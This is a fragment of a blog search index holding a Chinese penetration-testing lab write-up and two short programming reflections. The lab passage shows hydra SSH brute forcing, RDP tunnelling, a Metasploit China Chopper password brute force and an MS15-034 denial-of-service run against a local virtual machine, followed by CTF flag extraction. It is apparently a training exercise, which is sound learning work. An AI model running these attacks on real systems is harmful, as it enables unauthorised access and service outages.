directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br></pre></td></tr></table></figure><h2 id="（2）ssh测试"><a class="header-anchor" href="#（2）ssh测试">¶</a>（2）ssh测试</h2><ol><li><p>首先，通过hydra进行密码爆破，得到Administrator账号密码：admin321，即可建立ssh链接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">-sh-4.3$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>检测3389端口，发现端口是打开的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ nmap -p 3389 10.0.2.4                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 01:57 EST</span><br><span class="line">Nmap scan report for 10.0.2.4</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">3389/tcp filtered ms-wbt-server</span><br><span class="line">MAC Address: 08:00:27:0B:0C:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</span><br></pre></td></tr></table></figure></li><li><p>端口转发，并进行连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh -L 3389:localhost:3389 Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">Last login: Thu Dec 16 22:54:07 2021 from 10.0.2.15</span><br><span class="line">-sh-4.3$ </span><br><span class="line">(kali㉿kali)-[~]</span><br><span class="line">└─$ rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/QcGxjgtXmf9631H.png" alt="desktop"></p></li><li><p>实现可以直接在kali攻击机上进行对靶机的操作</p></li></ol><p>（3）caidao</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search caidao</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/caidao_php_backdoor_exec     2015-10-27       excellent  Yes    China Chopper Caidao PHP Backdoor Code Execution</span><br><span class="line">   1  auxiliary/scanner/http/caidao_bruteforce_login                   normal     No     Chinese Caidao Backdoor Bruteforce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/caidao_bruteforce_login                                                                                                        </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/http/caidao_bruteforce_login</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set TARGETURI /caidao.asp</span><br><span class="line">TARGETURI =&gt; /caidao.asp</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;admin&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;12345&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456789&#x27;</span><br><span class="line">[+] 10.0.2.4:80 - Success: &#x27;password&#x27;</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>找到连接口令：‘password’</p><h2 id="（4）80端口–http"><a class="header-anchor" href="#（4）80端口–http">¶</a>（4）80端口–http</h2><p>MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞（远程蓝屏代码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms15_034</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                  Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/dos/http/ms15_034_ulonglongadd                               normal  Yes    MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service</span><br><span class="line">   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump                   normal  Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/ms15_034_http_sys_memory_dump                                                                                                  </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/dos/http/ms15_034_ulonglongadd </span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/dos/http/ms15_034_ulonglongadd):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     10.0.2.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framewor</span><br><span class="line">                                         k/wiki/Using-Metasploit</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.p</span><br><span class="line">                                         ng)</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br><span class="line"></span><br><span class="line">[*] DOS request sent</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br></pre></td></tr></table></figure><p>结果靶机没有蓝屏，而是立即重启了，也蛮有趣的</p><h1>三、后渗透阶段（flag挖掘）</h1><p>很像是在打CTF，做得蛮开心的~</p><h2 id="1-the-joker"><a class="header-anchor" href="#1-the-joker">¶</a>1. the_joker</h2><ol><li><p>发现80端口是打开的，用浏览器打开，不难从html页面发现隐藏的HEX代码，通过<code>curl http://10.0.2.4/ &gt; data.html cat data.html | perl -ne 'print $1 if(/value\=\&quot;(\w+)\&quot;\&gt;/g)' &gt; data.hex</code> 获得hex.txt见附件</p></li><li><p>不难猜想可由hex转图片，<a href="http://xn--hex2png-lr4kf0uz1a093n.py">于是写出hex2png.py</a>，获得flag。</p></li><li><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>) <span class="keyword">as</span> f, <span class="built_in">open</span>(<span class="string">&#x27;data.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> fout:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        fout.write(binascii.unhexlify(line))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/21KMvxdUwutezon.png" alt="joker"></p><h2 id="2-Ace-of-Hearts"><a class="header-anchor" href="#2-Ace-of-Hearts">¶</a>2. Ace_of_Hearts</h2><ol><li>打开目录不难找到一张普通的红桃A，文件异常之大，不难发现端倪，可能是多文件隐藏。</li><li>查看二进制格式，把第一个jpg文件删去，即得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/nMzVcvW26uNOpyC.png" alt="ace_of_hearts"></p><h2 id="3-Jack-of-Hearts"><a class="header-anchor" href="#3-Jack-of-Hearts">¶</a>3.  Jack_of_Hearts</h2><ol><li><p>不难在document目录下发现Jack_of_Hearts.docx，考虑单文件docx中的PNG隐藏文件</p></li><li><p>将docx文件后缀改为.zip就会得到一个压缩文件，在\word\media中就能找到隐藏的图像flag文件）</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/kmhuVc8ApNgj3yM.png" alt="jack_of_hearts"></p><h2 id="4-Six-of-Diamonds"><a class="header-anchor" href="#4-Six-of-Diamonds">¶</a>4. Six_of_Diamonds</h2><ol><li>在C:\inetpub\wwwroot目录下不难找到six_of_diamonds压缩包，发现经过加密</li><li>首先考虑是不是伪加密，将全局方式位标记改为 00 00，未能成功打开，说明确实有密码</li><li>使用ARCHPR进行爆破，密码为vagrant，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/MxJXZNs3TrvQhou.png" alt="six_of_diamonds"></p><h2 id="5-King-of-Diamonds"><a class="header-anchor" href="#5-King-of-Diamonds">¶</a>5. King_of_Diamonds</h2><p>在C:\wamp\www\wordpress\wp-content\uploads\2017\09目录下直接找到King_of_Diamonds.png</p><p><img src="https://s2.loli.net/2021/12/17/cZ3u2kmh9aUxvg4.png" alt="king_of_damonds"></p><h2 id="6-Three-of-Spades"><a class="header-anchor" href="#6-Three-of-Spades">¶</a>6. Three_of_Spades</h2><ol><li><p>此图片我一通好找，突然想起可能是被隐藏了，最终在C:\windows目录下找到了</p></li><li><p>但是仍然无法打开，二进制格式打开根据文件头猜测文件被处理过，对文件异或操作，获得正常png格式</p></li><li><p>处理图片的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">_<span class="keyword">in</span> = <span class="string">&#x27;three_of_spades.png&#x27;</span>;</span><br><span class="line">_out = _<span class="keyword">in</span> + <span class="string">&#x27;.out&#x27;</span>;</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(_<span class="keyword">in</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    b[i] ^= <span class="number">0x0f</span></span><br><span class="line"><span class="built_in">open</span>(_out, <span class="string">&#x27;wb&#x27;</span>).write(b)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/4yeYRt9ZzgNpn8W.png" alt="three_of_spades"></p><h2 id="7-Seven-of-Spades"><a class="header-anchor" href="#7-Seven-of-Spades">¶</a>7. Seven_of_Spades</h2><ol><li>在Libraries\Documents目录下发现Seven of Spades.pdf，不难想到是隐藏在文件里了，使用pdf-parser即可获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/gLJlobmzvewOQI1.png" alt="seven_of_spades"></p><h2 id="8-Four-of-Clubs"><a class="header-anchor" href="#8-Four-of-Clubs">¶</a>8. Four_of_Clubs</h2><ol><li>类似7，Libraries\Music目录下找到Four_of_Clubs.wav，使用binwalk分离其中的flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/PWTZSrDiycuUKgX.png" alt="four_of-clubs"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ALU Reflection</title>
      <link href="/2021/10/15/ALU%20Reflection/"/>
      <url>/2021/10/15/ALU%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1>ALU Reflection</h1><h2 id="一、-实现过程中的bug"><a class="header-anchor" href="#一、-实现过程中的bug">¶</a>一、 实现过程中的bug</h2><ol><li>char 与 int 的转换老是忘记……</li><li>减法参数传反了（主要是顺序不符合正常逻辑</li><li>字符串相等用 equals</li></ol><h2 id="二、-反思"><a class="header-anchor" href="#二、-反思">¶</a>二、 反思</h2><ol><li>代码没有经过充分的测试前，都是错误的，在后面调用前面未测试的模块只会增加调试的麻烦。</li><li>多使用assert尽早发现问题</li><li>左移右移用的蛮多的，应该抽象为函数，重复了好多次</li></ol><h2 id="三、-收获"><a class="header-anchor" href="#三、-收获">¶</a>三、 收获</h2><ol><li><p>恢复除法存在的bug，即被除数为负与除数恰好相加为0是，被判定为异号不够除，但实际是够的。<br>解决方法：可以到最后调整余数与商。</p></li><li><p>自己写测试用例，将int最大最小值，0，正负相乘等边界情况做测试，也可以写random</p></li><li><p>char数组转String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.valueOf (Arrays.copyOfRange (arr, i, j))</span><br><span class="line">String.valueOf (Arrays.copyOf (arr, Length))</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TM Reflection</title>
      <link href="/2021/07/23/TM%20Reflection/"/>
      <url>/2021/07/23/TM%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1>TM Reflection</h1><p>这是第二次图灵机大作业完成后的反思与总结，将分为如下几部分：</p><ul><li>架构的反思</li><li>debug的过程</li></ul><h2 id="架构的反思"><a class="header-anchor" href="#架构的反思">¶</a>架构的反思</h2><p>1.TuringMachine的构造函数过于复杂，夹杂了许多功能，可创建Util工具类，使代码低耦合，数据与职责一致</p><p>2.Q, State,TransitionFuction之间的映射关系要理清，是个不错的架构，值得学习</p><p>3.对于Executor，它拥有的是Tapes，因此他的快照等功能应该是调用Tape的方法来“拼凑”实现整体，而不应该在Executor中调用到Tracks层面</p><h2 id="debug的过程"><a class="header-anchor" href="#debug的过程">¶</a>debug的过程</h2><p>1.第一次运行，什么错误信息都没有，什么输出都没有，合理推测问题在Execute方法，处理了一系列格式化问题，都怪猪脚需求写的不清楚（拍桌子）</p><p>发现需要知道空格符号，使我下定了改为自顶而下架构的决心，Executor没有理由需要知道B是什么符号，一次重构，费了点时间，但也算有收获</p><p>2.肉眼对比输出结果的我像个憨批，下次丕定（</p><p>3.第二次运行，发现多报了错误流信息，居然把String直接扔到Character集合中了，我当时怕是写傻了</p><p>4.顺手把错误检查全过了，Resolver判断是否冲突需要对上文所说两重映射完全理解</p><p>5.最后一出错点，挂掉我4个用例，居然是很浅显的错误，移动磁头（我一直很相信你的啊喂……），再一次警告自己不要乱复制</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
